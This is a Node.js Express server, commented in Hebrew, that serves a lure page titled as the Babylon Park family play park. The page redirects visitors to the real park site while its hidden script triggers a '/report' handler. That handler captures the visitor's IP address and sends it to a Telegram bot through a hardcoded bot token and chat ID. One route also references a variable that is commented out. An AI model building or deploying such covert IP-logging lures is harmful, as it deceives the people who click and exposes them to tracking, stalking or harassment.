const express = require('express');
const path = require('path');
const app = express();
const PORT = 3000;

// נתיב לתמונה
// const imagePath = path.join(__dirname, 'israelmap.jpeg');

// דף HTML שמכיל את התמונה ואת הקוד לביצוע בקשה
app.get('/babylonpark', (req, res) => {
    const htmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>בבילון פארק: חווית משחק לכל המשפחה</title>
        </head>
        <body>

            <script>
                // מבצע את המעבר מיידית
                window.location.href = 'https://babylonpark.co.il/';

                // שליחת הבקשה ל-report ברקע מבלי לחכות
                fetch('/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ timestamp: new Date().toISOString() })
                })
                .catch(error => {
                    console.error('Error reporting IP:', error);
                });
            </script>
        </body>
        </html>
    `;
    res.send(htmlContent);
});
// שליחת התמונה למשתמש
app.get('/image', (req, res) => {
    res.sendFile(imagePath);
});

// קליטת בקשה ודיווח IP עם שליחת הודעה לטלגרם
app.post('/report', (req, res) => {
    const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log(`IP Reported: ${userIP}`);
    
    const botToken = '7215028644:AAHWvsP3pDjjxgvU2MOw7MFVyeROWvb6gpM';
    const chatId = '247751626';  // ייתכן שתצטרך לשים מזהה משתמש/קבוצה אם השם לא נתמך
    const message = `IP Address: ${userIP}`;
    
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    fetch(telegramUrl)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Message sent to Telegram successfully.');
                res.send({ message: 'IP logged and sent to Telegram.' });
            } else {
                console.error('Failed to send message to Telegram:', data);
                res.status(500).send({ error: 'Failed to send message to Telegram.' });
            }
        })
        .catch(error => {
            console.error('Error sending message to Telegram:', error);
            res.status(500).send({ error: 'Error sending message to Telegram.' });
        });
});

// הפעלת השרת
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
